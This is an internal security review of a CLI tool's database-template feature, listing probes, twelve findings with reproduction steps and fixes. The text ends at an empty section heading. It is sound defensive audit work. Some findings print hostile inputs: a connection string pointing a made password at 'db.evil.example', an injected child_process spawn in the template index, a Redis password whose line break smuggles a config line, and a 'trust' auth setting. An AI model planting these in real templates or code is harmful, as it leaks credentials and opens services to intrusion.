# Security Review: Templates

Everything in [`specs/010-app-settings/security-review.md`](../010-app-settings/security-review.md),
[`specs/006-cli-small-features/security-review.md`](../006-cli-small-features/security-review.md),
[`specs/005-runner-release/security-review.md`](../005-runner-release/security-review.md),
[`specs/004-cli-app/security-review.md`](../004-cli-app/security-review.md) and
[`specs/003-cli-runner/security-review.md`](../003-cli-runner/security-review.md) still applies,
except where part 5 below says otherwise.

This is not an external audit. One independent reviewer, who did not write this feature's code,
read the source and ran its own probes. Nothing was fixed as part of this review (T055 as given to
the reviewer: record, do not fix). An external audit is still required before production use.

## 1. Scope and method

**Commit.** `4a399f6` on `012-templates`, the head when the review started, with a clean working
tree: the 16 commits of `git log dev..HEAD`, 13 of them after `d19b25f`, the base plan.md names. In
`apps/cli/src` that is 40 files, 4,373 lines added and 154 removed. Outside it:
`.github/workflows/pull-request-checks.yml`, `CONTRIBUTING.md`, `apps/web/modules/docs/lib/templates.ts`,
`apps/web/modules/docs/components/templates.tsx` and `mdx.tsx`, and the docs.

**Attackers considered**, as in the earlier reviews, with one more:

| Attacker | Can do |
|----------|--------|
| A project folder's author | Own the files of a cloned repository, or of a branch of the team's own repository: `zekno.app.json`, `compose.yaml`, folder names, links, a `zekno.json` the team did not sign. Holds no team key. |
| Attacker B | Change files in the profile folder (`~/.zekno`). Cannot read the keychain. |
| A contributor | Propose a template, a test, a client check, the index or a workflow change by pull request, from a fork or from a branch. |
| A runner or server that lies | Answer anything. `zekno add` contacts none (part 3), so it has nothing to answer. |
| Typed-ahead keys | Keys pressed before a question is on the screen. A condition, not an attacker. |

**Read in full**: `templates/` (`read.ts`, `shape.ts`, `catalogue.ts`, `made.ts`, `hand.ts`,
`addition.ts`, `shown.ts`, `publishers.ts`, `types.ts`, the code of `add-words.ts` and
`file-words.ts`), `templates/files/` (the four files and `index.ts`), `ops/add.ts`,
`ops/add-commit.ts`, `commands/add.ts`, `ui/ink/several.tsx`,
`.github/workflows/pull-request-checks.yml`, `CONTRIBUTING.md`,
`apps/web/modules/docs/lib/templates.ts`, `apps/web/modules/docs/components/templates.tsx`,
`test/templates/index.test.ts`, `catalogue.test.ts` (and its change in `49703b9`) and
`files.test.ts`.

**Read as diffs, with the code around them**: `cli/cli.ts`, `ops/settings.ts` (`findPlace`,
`readPlaced`), `ops/secret.ts`, `settings/write.ts`, `settings/schema.ts`, `settings/compose.ts`,
`settings/file.ts`, `settings/types.ts`, `asking/asking.ts`, `ui/ink/ink.tsx`, `ui/plain/plain.ts`,
`ui/types.ts`, `apps/web/modules/docs/components/mdx.tsx`, `apps/cli/package.json`.

**Read because the new code leans on it**: `settings/source.ts` (`chooseSource`, `settingsPlace`),
`project/project.ts` (`withProject`: a link's file only for its own app), `profile/profile.ts` (the
store's write), `ui/ink/raw-mode.tsx` (`asking`), `packages/core/src/secrets/secret-record.ts`
(what `createSecret` throws), `.github/workflows/runner-release.yml` and `main-versions.yml`, and
the entrypoints of the Redis and MongoDB images, copied out of the local image store.

**Drawn, not read line by line**: `ui/ink/addition-report.tsx`, `ui/ink/templates.tsx` and the
diffs of `questions.tsx`, `lines.tsx`, `left-behind.ts`, `panel.tsx` and `settings-report.tsx`. What
they are given was read: `AdditionReport`, `TemplateView` and `HandLines` hold names that passed
their rule, fixed words and the reviewed template's own text, and no secret value.

**Specs read**: `spec.md`, `plan.md`, `research.md`, `data-model.md`, the three contracts,
`quickstart.md`, `tasks.md` (T055); the review of feature 010 in full, and the finding tables of
the reviews of features 003 to 006.

**Run**:

- The feature's tests with no Docker part: `test/templates`, `test/ops/add*.ts`,
  `test/ops/settings-place.test.ts`, `test/commands/add*.tsx`, `test/scenarios/add-*.ts`,
  `test/plain`, `test/version`, `test/layers`, `test/ui/ink/several`, `templates`,
  `addition-report` and `list-column`, `test/settings`: 1,025 pass, 4 skip (the Docker part of
  `test/templates/docker.test.ts`, which needs `ZEKNO_TEMPLATES_DOCKER=1`, was not run).
- Feature 010's own tests and the pinned scripts: `test/commands/settings.test.tsx`,
  `test/ops/settings.test.ts`, `test/scenarios/settings-which-file`, `settings-exact-name`,
  `settings-compose`, `settings-deploy`, `test/app/settings-effects`, `settings-state`,
  `settings-screen`, `test/asking`, `test/docs`, `test/server/check-script.test.ts`,
  `test/server/install/script.test.ts`: 361 pass. `test/asking/first-deploy.test.ts` prints a line
  from its stand-in `ssh` toward `deploy@example.test`; no real `ssh` ran.
- `test/scenarios/templates-real-docker.test.ts` (SC-008), with real Docker and the local runner:
  4 pass; projects `zekno-probe-<template>-<pid>`, no port published, all removed. Its first run
  failed all four at the deploy: the temporary `HOME` hid Docker's own configuration. Two
  diagnostic deploys (projects `zekno-probe-err` and `zekno-probe-err2`, removed with
  `docker compose down -v`) showed that; the run with `DOCKER_CONFIG` set passed.
- `apps/web/modules/docs/lib/templates.test.ts`: 4 pass.
- Fourteen throwaway probes in a scratch folder outside the repository, importing the repository's
  modules and test helpers, each with a temporary `HOME` and `ZEKNO_HOME`, the in-memory key store,
  and the local runner with the stand-in Docker where a server was needed:
  1. the hand-written lines of a template carrying 64 hostile plain values and names and a hostile
     start command, read by `docker compose -p zekno-probe-hand config` (Compose v5.3.0; reads,
     starts nothing), against the values written (point 2 of the builders);
  2. 20 new hostile template files through `readTemplate`, with a new sentinel, and 5 templates
     that pass every rule and only a reviewer can judge;
  3. where a made value can go, end to end through `run`: the system's random source replaced only
     for calls from `makePassword`, so every made character is `Z`; every printed line and every
     file of the folder and the profile searched; `connect` and `fetch` replaced by functions that
     throw;
  4. a link or a second name put in place of the settings file before step d, and a link put in
     place of it before step f;
  5. compose.yaml beside zekno.app.json with nothing that decides (point 1 of the builders); a
     second machine of the member where a team-signed `zekno.json` is not in use yet;
  6. `zekno add --app <other>` in a sub-folder of a linked folder, and what the deploy signs there;
  7. services of the file that already list a made or a connection secret's name;
  8. the index test's own checks on the real index with one statement more;
  9. `bun build.ts` of HEAD into the scratch folder, and of a copy of HEAD made with `git archive`
     (no untracked file, so no `.env.local`) holding one indexed and one unindexed template, each
     with its own marker; `strings` on both binaries; `zekno add --list` and `--show` run from `/`;
  10. each pinned image started with its password empty, unset, holding a space, or holding a line
      break (`docker run --network none`, containers named `zekno-probe-…`, removed at once), and
      the Redis and MongoDB entrypoints copied out with `docker run --rm --network none
      --entrypoint cat`;
  11. an Enter and a space typed before the readers question, on the tests' stand-in terminal;
  12. `zekno add` with no flags, answered as at a terminal (the tests' `answering` interface),
      asking for the app with `connect` and `fetch` that throw;
  13. the docs page's reader called from another folder;
  14. the `docker image ls --tree` of each pinned image (local store, no pull).
- At the end, `docker ps -a`, `docker volume ls` and `docker network ls` were compared with a list
  taken before the first probe: equal.
- Not used: the system keychain, `~/.zekno`, a remote server, `ssh`, the network (no image pulled;
  no tag looked up on Docker Hub), ports 3000 or 3100, `next dev`, `next build`, `apps/cli/.env.local`,
  the end-to-end tests under `apps/cli/tests`, a real terminal or pseudo-terminal.

## 2. Findings

| Id | Severity | Finding | Confirmed | State |
|----|----------|---------|-----------|-------|
| T1 | Medium | A service of the file that already lists a made secret's name, or the connection secret's name, reads it after `zekno add` without being named; the summary's "read by" and AD7's advice say otherwise | Yes, by a probe | Fixed in `325ebb2` |
| T2 | Low | `zekno add --app <other>` under a link in use writes the linked app's file and stores the other app's secrets (P2 of feature 004, for `zekno add`) | Yes, by a probe | Fixed in `f4956c2` |
| T3 | Low | With compose.yaml beside zekno.app.json and nothing that decides, `zekno add` writes the settings file with no IN6 (`AddTarget.both` is never read) | Yes, by a probe | Fixed in `d6e4676` |
| T4 | Low | The hand-written path skips SH4: on a machine where a team-signed `zekno.json` naming a settings file is not in use yet, `zekno add` prints lines for compose.yaml, then records the link that makes the deploy sign the other file | Yes, by a probe | Fixed in `65c085d` |
| T5 | Low | No rule holds a connection secret to `{service}`: a template can send the app, with the made password, to any host | Yes, by a probe | Fixed in `8028557` |
| T6 | Low | The index test does not hold `index.ts` to "nothing else", and the index runs at every start of `zekno` | Yes, by a probe | Fixed in `8028557` |
| T7 | Low | `CONTRIBUTING.md` calls a template "never code", and does not tell a reviewer what in a template runs, nor where not to run a pull request's tests | Read only | Fixed in `dd517bc` |
| T8 | Informational | Redis's start command: a password holding a line break adds lines to Redis's configuration | Yes, by a probe |  |
| T9 | Informational | The window of research R7, and the store's write | Yes for the images; read for the rest |  |
| T10 | Informational | The docs page's reader | Yes, by a probe and reading |  |
| T11 | Informational | The pull-request workflow: what a hostile pull request can still do | Read only |  |
| T12 | Informational | The summary before the question shows neither plain values nor a start command | Read, and seen in probe 2 |  |

No finding is rated high or critical. No way was found to make a made value appear anywhere but in
its sealed record, to make the hand-written lines ask Compose for a variable that is not a secret's,
to make `zekno add` contact a server, or to get a template into the CLI that the index does not name.

### T1. A service that already lists a secret's name reads it, unnamed (Medium)

**Why medium**: the summary exists to say which services will read which secret (FR-005, US1
scenario 1); here it under-reports, and the developer who picked only `web` gives the database's
password, or its address, to a service they left out on purpose. It needs the secret's name in
another service's `secrets` before `zekno add` runs: a one-word change of a pull request, or the
developer's own earlier edit. AD7's own advice leads into it.

**Where**: `apps/cli/src/templates/addition.ts:150-159`, step 11, checks only the services chosen
to read each connection secret (`readBy`), and only for the connection secret's name. No step
looks at the other services of the file, and none at the made secrets' names. AD5
(`ops/add.ts:221-230`) looks at the app's secret store only, so a name listed in the file and not
yet stored passes. The summary's `readBy` (`templates/shown.ts:86-99`) is the template's own
services for a made secret and the chosen readers for a connection secret. AD7
(`templates/add-words.ts:48-49`) says `Remove it, or leave <svc> out with --for <service>.`
Secrets are the app's: the Compose text gives each service every secret its `secrets` lists
(`settings/compose.ts`).

**Who**: a project folder's author, against a developer who reads the summary before saying yes.

**Steps and result** (probe 7):

- **A.** `web` with no secret; `worker` (`example/vendor-sidecar:1`) listing `POSTGRES_PASSWORD` and
  `DATABASE_URL`. `zekno add postgres --for web --app demo --server dev`, answered as at a terminal
  (the tests' `answering` interface): the summary
  says `DATABASE_URL read by web` (and, by `shown.ts:89-91`, `POSTGRES_PASSWORD read by
  postgres`); one question; yes; status 0. `zekno settings compose` then gives `worker`
  `"POSTGRES_PASSWORD": "${POSTGRES_PASSWORD}"` and `"DATABASE_URL": "${DATABASE_URL}"`.
- **B.** `web` listing `DATABASE_URL`, and `worker`. `zekno add postgres --yes ... --for web`: AD7,
  `web already has a variable named DATABASE_URL. Remove it, or leave web out with --for
  <service>.`, status 2. Following its advice, `--for worker`: status 0, and the Compose text still
  gives `web` the new `DATABASE_URL`.

**Smallest fix**: in `planAddition`, after step 11, refuse (status 2) when any service of the file
lists in its `secrets` a made secret's name, or a connection secret's name without being one of
its readers (a plain variable of that name reads no secret and can stay); reword AD7's second
sentence to "Remove it from <svc>." for a name in `secrets`. Then the summary's `readBy` is true as
it is. The test that fails today:
`test/templates/addition.test.ts`, a file whose `worker` lists `POSTGRES_PASSWORD` (and another
whose `worker` lists `DATABASE_URL`), `readers: ["web"]`: today an `Addition`, after the fix a
refusal naming `worker`; and B's two runs in `test/scenarios/add-scripts.test.ts`, whose second
gives status 0 today.

**State**: Fixed in `325ebb2`. `planAddition` (step 11) refuses any service of the file, reader or
not, that lists in its `secrets` a name the template makes or builds, with a new sentence, AD29
(`<svc> already reads a secret named <NAME>. Remove it from <svc>.`, status 2), and keeps AD7 for a
plain variable of a reader; `test/templates/addition-readers.test.ts` holds it (for 2,000
generated files, every addition accepted gives each new secret to exactly the services the
summary names), with `addition.test.ts` and `test/scenarios/add-readers.test.ts` (probes A and B).

### T2. `--app` chooses the secrets' app, the link chooses the file (Low)

**Why low**: the person typed `--app`; nothing runs open (the linked app's next deploy has a
database service with no password, which refuses to start, research R4); the plain line names the
file by its path. But it is P2 of feature 004 again, for `zekno add`: a link's file goes only with
its own app.

**Where**: `apps/cli/src/ops/add.ts:275-283`. `targetOf` decides the file from the link in use
(`ops/settings.ts:141-143`, `settingsPlace(deps.cwd, inUse)`) before, and whatever, the app
`where` gives. `zekno deploy` gives the link's file only to the link's own app
(`project/project.ts:219-231`).

**Who**: nobody needs to act; a repository with several apps does it.

**Steps and result** (probe 6): the root linked to `demo` (its `zekno.app.json`, image
`example/root:1`); `sub/zekno.app.json` of its own (`example/sub:1`). In `sub`,
`zekno add postgres --yes --app billing --server dev`: status 0, `added postgres <root>/zekno.app.json`,
`stored POSTGRES_PASSWORD 1`, `stored DATABASE_URL 1`. The root's file gains `postgres`; `demo`
has no secret; `billing` has both. `zekno deploy --app billing --server dev` in `sub` signs
`sub/zekno.app.json` (`example/sub:1`), with no `postgres`.

**Smallest fix**: decide the file after the app and server, by the deploy's own rule for that app:
when the link in use names a file and `--app` or `--server` differs from the link's, use
`chooseSource(cwd, {})` (this folder's own file), as `withProject` does, or stop with a sentence
that names both. The test that fails today: the probe's folders in
`test/scenarios/add-settings.test.ts`, expecting `sub/zekno.app.json` to gain the service (or a
refusal) and the root's file unchanged.

**State**: Fixed in `f4956c2`. `findPlace` takes the app given with `--app`, and a link's file goes
only with its own app, as `withProject` gives it, so with another app the file is this folder's own
(`--server` does not change it, as it does not for the deploy); `test/scenarios/add-settings.test.ts`
holds it with the probe's folders (the sub-folder's file gains the service, the root's is
unchanged, and `zekno deploy --app billing` there signs that very file), with
`test/ops/settings-place.test.ts`.

### T3. compose.yaml beside the settings file: written, with no note (Low)

**Why low**: nothing is unsafe. The deploy in that folder asks which file (DP1) at a terminal, and
in a script stops with DP2, status 2, so nothing deploys a file the person did not choose. But a
script's `zekno add` succeeds silently and the next step fails, and a person at a terminal who then
picks compose.yaml has a database that never starts. `zekno settings set` says IN6 here.

**Where**: `apps/cli/src/ops/add.ts:74-76` and `:184-194` set `both`; nothing reads it
(`commands/add.ts:264-278`). `commands/settings.ts:87-88` says IN6 for the same case.

**Steps and result** (probe 5, A): no `zekno.json`, `zekno.app.json` and `compose.yaml` here.
`zekno add postgres --yes --app demo --server dev`: status 0, AD23's three lines, nothing on
standard error. `zekno settings set web.memory 1g --yes`: IN6 on standard error. `zekno deploy
--app demo --server dev`: `This folder has zekno.app.json and compose.yaml. Say which with -f
<file>.`, status 2.

**Smallest fix**: say IN6 as a warning when `plan.target.both`, before the summary at a terminal
and on standard error in a script, as `settings set` does. The test that fails today: the probe's
first run in `test/scenarios/add-scripts.test.ts`, expecting IN6 on standard error.

**State**: Fixed in `d6e4676`. `zekno add` says IN6, unchanged, when compose.yaml is beside the file
and nothing decides: at a terminal as a warning before the summary, in a script on standard error
once added, so that AD4 stays the one line without `--yes`; `test/scenarios/add-scripts.test.ts`
(the probe's run) and `test/commands/add.test.tsx` hold it, and `plain-unchanged.test.ts` passes
untouched.

### T4. The hand-written path does not say SH4 (Low)

**Why low**: no file is written on that path, and the first-use question names the right file. But
the lines say `This folder deploys from compose.yaml`, after the person's yes made that false; the
secrets are stored for an app whose deploy will not have the service. It is S6 of feature 010 on
the one path that fix left out.

**Where**: `apps/cli/src/ops/settings.ts:146-152` says SH4 only when the place is a settings file.
`apps/cli/src/ops/add.ts:275-279` takes the target before `where()`, which asks the first-use
question and records the link (`withProject`).

**Who**: whoever can change the files of a branch whose team-signed `zekno.json` names another
file; the victim is a member on a machine where it was never used.

**Steps and result** (probe 5, B): on machine 1, `deploy/zekno.app.json` and `compose.yaml` in a
folder, `zekno link --app demo --server dev -f deploy/zekno.app.json`. On a second machine of the
member (`twin`), answered as at a terminal (`answering`), `zekno add postgres`: `Ada linked this folder to demo on dev, with
deploy/zekno.app.json. Use it here?`, yes; then the lines for compose.yaml; `Make and store its two
secrets for demo on dev?`, yes; status 0. Afterwards `zekno settings compose` there prints
`deploy/zekno.app.json`'s text, with no `postgres`.

**Smallest fix**: in `findPlace`, say SH4 also when the place is a Compose file and the pending
link names another file than that one. The test that fails today: the probe's folder in
`test/scenarios/add-hand.test.ts` on a `twin`, expecting SH4 and status 1 before any question.

**State**: Fixed in `65c085d`. `findPlace` says SH4, unchanged, whenever a zekno.json not in use here
yet names another file than the one here, a Compose file included (the settings commands, which
share it, now say SH4 there instead of SH2); `test/scenarios/add-hand.test.ts` holds it on a `twin`
(SH4 and status 1 before any question, in a script and at a terminal, nothing stored), with
`test/ops/settings-place.test.ts`.

### T5. A connection secret may point at any host (Low)

**Why low**: templates are reviewed, and the summary shows the host (`@db.evil.example`) with the
password hidden. But it is the one place a template file can send the user's data and the made
password off the server, it needs no start command, and neither the rules nor the reviewer's list
name it. TT3 would catch it only for a kind of software that has a client check.

**Where**: `apps/cli/src/templates/shape.ts:40` (`OFFER_TEXT`) allows any host;
`templates/read.ts:298-310` (TF27 to TF29) check names only. `CONTRIBUTING.md:175-187` does not
ask about it.

**Steps and result** (probe 2): postgres's file with `DATABASE_URL` =
`postgres://app:{POSTGRES_PASSWORD}@db.evil.example:5432/app`, and another with
`@{service}.evil.example`: both read as templates; the value stored would be
`postgres://app:<password>@postgres.evil.example:5432/app`.

**Smallest fix**: a rule TF34: an offer holds `{service}` exactly once, right after `//` or `@`,
followed by `:`, `/` or the end. Add "the connection secret points at `{service}` and nowhere
else" to the reviewer's list. The test that fails today: a faulty fixture in
`test/support/template-files.ts` for each of the two offers above.

**State**: Fixed in `8028557`. A new rule of the reader, TF34 (`a connection secret points at
{service} and nowhere else.`), after TF29: `{service}` exactly once, as the whole host (after `//`
or `@`, followed by `:`, `/`, `?` or the end, inside the authority, with no `@` after it); the four
first templates pass unchanged and the reviewer's list gains the line; six faulty fixtures of
`test/support/template-files.ts` (the review's two offers among them) and
`test/templates/read-offers.test.ts` hold it. A query that a client reads as a host (libpq's
`?host=`) is still the reviewer's to catch.

### T6. The index is code, held to its lines only (Low)

**Why low**: a maintainer reads the diff of `index.ts`. But the guide sets "one template file and
its line in the index" apart from what is "reviewed as code", the contract says the index holds
"nothing else", and the index module runs at every start of `zekno` on every user's machine:
`main.ts:6` imports `cli/cli.ts`, which imports `commands/add.ts`, then `ops/add.ts:47-52`, then
`templates/catalogue.ts:22`, which loads the index and its top-level awaits.

**Where**: `apps/cli/test/templates/index.test.ts:30-64` finds the lines with a pattern and checks
them; `:93-96` checks each line found is written as the contract writes it. Nothing checks the
text has nothing else. The layering test (`test/layers/layers.test.ts:772`) still lets an import
of a `node:` built-in through.

**Steps and result** (probe 8, the test's own `linesOf`, `indexProblem` and line check taken from
its text): the real index with
`import("node:child_process").then((cp) => cp.spawn("sh", ["-c", "true"]))` after its list: no
problem, every line as the contract writes it, 4 lines found.

**Smallest fix**: in `index.test.ts`, the index's text must equal the contract's header comment,
`export const TEMPLATE_FILES = [`, `lineFor(name)` for each file in the order of the names, and
`] as const`, nothing more. The test that fails today: that comparison on the index above.

**State**: Fixed in `8028557`. `index.test.ts` holds the index's whole text to the contract's form
(the contract's own comment, the list, one line per file in the order of the names, nothing else);
`files/index.ts` already matched and is unchanged; the test "nothing else" holds it: the probe's
index with a statement more after the list, and the same before it, inside it, with another
comment or with none, each passes TI1 to TI5 and the line check and fails the whole text.

### T7. The guide does not say what in a template runs (Low)

**Why low**: the reviewer's list names the start command, and the guide says changed code is
reviewed as code. But the words a contributor and a reviewer read first are wrong, and the steps
that run a pull request's code on a person's machine come with no warning.

**Where and what**:

- `CONTRIBUTING.md:15` "It is never code." and `:210` "no code, ... nothing fetched". A service's
  `deploy.start` is a command run by a shell in the container on the user's server, with the
  template's passwords in its environment and the network open; plain values configure the
  software (`POSTGRES_HOST_AUTH_METHOD=trust` passes every rule, probe 2); an official image may be
  a general one (`alpine`, probe 2). The spec says it plainly: "A template is code that runs on the
  developer's server."
- `:162-165` "the reviewer connects by hand", and the "Running the tests" part, never say where.
  The maintainer's machine holds the team key and `apps/cli/.env.local`. `bun install` without
  `--ignore-scripts`, `bun run test:templates` and a client check (code, `:202-203`) of a pull
  request run that pull request's code as the person who runs them; TT3 starts the template's
  containers with that person's Docker, which on Docker Desktop reach the host's own services
  through `host.docker.internal`.
- `:175-187` does not ask about a connection secret's host (T5), nor about `also` names that claim
  another software's common name (`postgresql`, `pg`), which AL3 then points people at.

**Smallest fix**: say that a template is data that configures and starts software on the user's
server: its start command and plain values are what runs, and are read as code. Tell a reviewer
to read every changed line before running anything of a pull request, and to run its tests and
connect by hand only on a machine that holds no Zekno key and no `.env.local` (a throwaway virtual
machine), with `bun install --ignore-scripts`. Add T5's line and the `also` line to the reviewer's
list. A test: `test/docs` gains a check that `CONTRIBUTING.md` no longer says "never code".

**State**: Fixed in `dd517bc`. CONTRIBUTING.md says a template configures and starts software on the
user's server, its start command and plain values read as code; that a reviewer reads every line a
pull request changes before running anything of it, and runs its tests, install and client check,
and connects by hand, only on a machine with no Zekno key and no `apps/cli/.env.local`, with
`bun install --ignore-scripts`; and the reviewer's list gains the `{service}` and `also` lines;
`test/docs/contributing.test.ts` holds it.

### T8. Redis's start command and a password of other characters (Informational)

**Why informational**: zekno makes the password of 32 letters and digits, which is safe there.
Only someone who can set the app's secrets (a team member, who can deploy anything) can give it
other characters.

**Where**: `apps/cli/src/templates/files/redis.json:13`.

**Every word, as run** (probe 10, and the entrypoint read): the container starts as root; `sh` is
dash, in which `umask` and `printf` are built in, so the password is on no process's command line
(`sh`'s own arguments hold `$REDIS_PASSWORD`, not its value); `umask 077` then the redirect make
`/tmp/auth.conf` mode 600; `chown redis` makes it Redis's (seen: `-rw------- 1 redis root`); the
image's `docker-entrypoint.sh` leaves `/tmp` as it is, since `redis` can read it
(`fix_config_perms`), and drops to `redis` with `setpriv --nnp`. The file is in the container's
own layer, written again by root at each start; `/proc/sys/fs/protected_symlinks` is 1 in Docker
Desktop's kernel, so a link Redis put there would not be followed.

**Result**: empty or unset, a space, or (by Redis's parser) a quote: `FATAL CONFIG FILE ERROR ...
wrong number of arguments`, exit 1. A line break: the rest is a configuration line of its own;
`REDIS_PASSWORD` = `pw` + line break + `port 7777` started `redis-server *:7777`.

**If ever needed**: write the password with Redis's quoting, or refuse a value with a line break
before writing it (`case "$REDIS_PASSWORD" in *[!A-Za-z0-9]*) exit 1;; esac`).

### T9. The window of research R7, and the store's write (Informational)

The builders' point 3, recorded and not rated as a defect.

- **The images refuse to start without their password** (probe 10, fresh, network none):
  postgres (`superuser password is not specified`), mysql (one of `MYSQL_ROOT_PASSWORD`, ... is
  required), mongo (`missing 'MONGO_INITDB_ROOT_USERNAME' or 'MONGO_INITDB_ROOT_PASSWORD'`), redis
  (`wrong number of arguments`), each exit 1. Research R4 holds.
- **Over a volume that already holds data** (a service removed and added again, the volume kept):
  read, not run. MongoDB's check (entrypoint lines 258 to 270) and Redis's start command run at
  every start, so both still refuse. PostgreSQL and MySQL check only an empty data folder; they
  start with the old accounts, which still need the old password. Nothing starts open.
- **The window is longer than two renames after a power cut.** The store's write
  (`profile/profile.ts:126-142`) renames a file it did not flush, as every profile write does since
  feature 003 (its R4 made the runner's writes durable, not the CLI's). After a crash of the
  machine the settings file is on disk (flushed) and the new store may not be. Process kills are as
  research R7 says.
- **No lock on the store**: a `zekno secret set` for the same app between step e's compare and its
  rename is lost, or the other way round. The service then has no password, which fails closed as
  above.

### T10. The docs page's reader (Informational)

The builders' point 4. `apps/web/modules/docs/lib/templates.ts:68-74` lists every `*.json` of the
folder, not the files the index names, reads each with `JSON.parse` (a key written twice: the last
wins), and finds the folder from `process.cwd()` (`:69`): called from another folder, it reads
`/private/cli/src/templates/files` and throws (probe 13). The component catches that at load and
throws only where the table is drawn. Values reach the page as React text, each held to its
pattern, so no file can put markup there. TI1 keeps the folder and the index alike, and TT1 refuses
a key written twice, so a merged file cannot show the docs another name or author than the CLI.
`zod` is not in `apps/web/package.json`; it resolves to the root's (`package.json`, `dependencies`,
`^4.6.7`). If needed: read the folder from the module's own place (`import.meta.dirname`), and
declare `zod` in `apps/web`.

### T11. The pull-request workflow (Informational)

The builders' point 6. Read, not run (it has never run on GitHub). CW1 to CW8 hold as written, and
`test/templates/workflow.test.ts` checks CW1 to CW7. No value of the event reaches a shell: the one
expression from it is the pull request's number, in `concurrency`.

What a hostile pull request can still do:

- **Run any code on GitHub's machine**, for up to the timeout it sets itself (a job may run 6
  hours): it can change the workflow, the tests, `package.json` scripts and the lockfile. From a
  fork its token can only read and it gets no secret, whatever its copy of the workflow asks.
  `persist-credentials: false` keeps the token out of `.git/config`, but the job's code runs with
  `sudo` on that machine and can read the token from the runner's own process; from a fork, with
  `contents: read`, that token reads only what is public.
- **Not reach `runner-release.yml`**: that runs on a pushed tag only, from the tagged commit; its
  artifacts belong to its own run. A cache written by a pull request's run (`setup-bun` caches the
  Bun it downloads) is scoped to that pull request's merge ref, which a tag's or `main`'s run does
  not read (GitHub's documented scoping; not run here).
- **Change `runs-on`**: a self-hosted runner attached to this public repository would run a fork's
  code. None is named in the three workflows; whether the repository has one was not visible.
- **Make `checks` pass whatever it changed.** `CONTRIBUTING.md:197-206` says so truthfully ("never
  merged because the check passed"), and that the required check and first-time approval are the
  maintainer's settings. A contributor with one merged pull request is no longer first-time: MS2's
  approval covers only a first pull request; "all outside collaborators" is the setting that covers
  every fork.
- A branch of this repository (not a fork) has the repository's secrets and may ask for a token
  that writes; whoever can push a branch can already push.

What `CONTRIBUTING.md` does not say is T7.

### T12. The summary shows neither plain values nor a start command (Informational)

`templates/shown.ts` (`additionReport`) carries the image, restart, port and volumes of each
service, and the secrets; plain values and a start command are only in `--show` (D26, approved).
A reviewed template that weakens its software (T7's `trust`) would not show it at the question.
Recorded; the maintainer chose it.

### Not reproduced, or needs validation

- **The hand-written lines read by `docker compose up` on a Linux server.** Only `docker compose
  config` (v5.3.0, macOS) read them. Both use the same loader; `up` was not run.
- **The digests are the ones the tags named on 2026-11-17.** No tag was looked up (no network).
  `docker image ls --tree` shows each pinned index holds `linux/amd64` and `linux/arm64/v8`
  (MongoDB's also two `windows/amd64` entries).
- **Bun's text loader and a template file that is not UTF-8.** The CLI reads the index's texts as
  strings, for which TR3 checks only lone surrogates; a byte that is not UTF-8 would reach the
  reader already replaced. TT1 reads the bytes from the disk and refuses it, so a released zekno
  cannot carry one. Not run.
- **GitHub's behaviour** (fork tokens, cache scoping, first-time approval): from GitHub's
  documentation, not run.

## 3. Properties checked and found to hold

**The template reader** (`templates/read.ts`, `shape.ts`):

| Property | Enforced at | Checked |
|----------|-------------|---------|
| One strict read: the name, at most 16 KiB (bytes or a string's UTF-8 length), strict UTF-8, one byte order mark dropped, then feature 010's `readJson` (a key twice at any depth, compared after escapes; depth 6; strings of 4,096) | `read.ts:88-120`, `:320-336` | Probe 2: 16,385 bytes, `0xff`, a lone surrogate, `"name"` after `name`, 5,000 nested lists: TR2, TR3, TR3, TR4, TR4 |
| Known fields only, `asks` refused by its presence, in the order of the text | `read.ts:46-59`, `:349-352` | Probe 2: `__proto__` at the top is TF3; an unknown key before `asks` is TF3 |
| No key reaches a prototype: the top and each made secret through `Object.fromEntries` into `strictObject`s, `makes` and `offers` as `Map`s | `read.ts:149-166`; `shape.ts:80-120` | Probe 2: `__proto__` inside a made secret is TF16 |
| Numbers by their text: `length` held to `^[1-9][0-9]*$` and 24 to 64; `template` to `1` | `shape.ts:83-91`; `read.ts:340-346` | Probe 2: `1e400`, `32.0`, `0` are TF16; `1.0` is TF1 |
| `services` by every rule of a settings file, then the template's own (pinned, tagged, `docker.io/library` form, no `publish`, only made secrets read, volumes added under unique names, each made secret read, offers built from made secrets and `{service}` only, the version, the backup note) | `read.ts:357-372`, `:265-317`; `publishers.ts:24-48` | `test/templates/read.test.ts` (each sentence); probe 2 |
| No content in any fault: a place built from names that passed their rule, a line number, fixed words; every exception caught | `read.ts:79-99`, `:401-418` | Probe 2: a new sentinel in a made name with a wrong value, an offer name with wrong text, `also`, a note, a service name, a volume name, a plain value with U+202E, an image: none in the sentence or the raw fault |
| Cost | the bounds above; patterns with no nested repeat that can backtrack (`OFFER_TEXT`, the publisher's form) | Read |

**The catalogue** (`templates/catalogue.ts`, `files/index.ts`):

| Property | Enforced at | Checked |
|----------|-------------|---------|
| Only the files the index names are in the program; each import's path written out; nothing is read from the folder, the profile or the network | `files/index.ts:7-12`; `catalogue.ts:41-46` | Probe 9: HEAD's binary holds each pinned digest once; a copy with `aa-indexed.json` in the index and `zz-unindexed.json` not: `strings` finds the first's marker once and the second's never; `--list` from `/` lists the first only. `--list` and `--show` from `/` create nothing in `ZEKNO_HOME` |
| Each text read by the strict reader once per run; a fault is AD27, a template that asks is AD28 | `catalogue.ts:81-100` | `catalogue.test.ts` |
| The first four first, in the boards' order, then by name | `catalogue.ts:49-61` | `catalogue.test.ts` |
| The loosened catalogue test (builders' point 5) lost no protection of the first set: `files.test.ts:98-106` still holds the four files byte for byte to the contract, and `catalogue.test.ts:45-55` the first four in order and equal to the contract's templates. What it gave up is that a new template needs a test change, which FR-022 asks for; the index test and the review are then the gate (T6, T7) | | Read |

**Made values** (`templates/made.ts`, `ops/add-commit.ts`):

| Property | Enforced at | Checked |
|----------|-------------|---------|
| The system's random source (`crypto.getRandomValues`), one byte per character, bytes of 248 and above thrown away: 248 is 4 × 62, so each of the 62 characters is equally likely; 32 characters are about 190 bits; a source that gives only thrown-away bytes stops after 1,000 rounds | `made.ts:22-54` | Read; `made.test.ts` (200,000 characters within 10% of their share) |
| A value exists only inside the function given to `withSigner`, in a map cleared once sealed, and reaches only `createSecret`; `createSecret`'s and `fillOffer`'s errors hold no value; nothing logs | `add-commit.ts:88-123`; `ops/secret.ts:85-97`; `git grep` for `console.` and writes to the streams in the new files: none | Probe 3: postgres to a settings file, redis by hand, mysql with the store refused (AD20, the file put back byte for byte): the made characters in no line and no file of the folder or the profile; 4 calls from `makePassword`; `connect` and `fetch` never called |
| No `--json` of adding; `--show --json` and `built` lines give the offer's text with its placeholders | `commands/add.ts:116`; `shown.ts` | Read; tests |

**Whole or not at all** (`ops/add-commit.ts`, `settings/write.ts`):

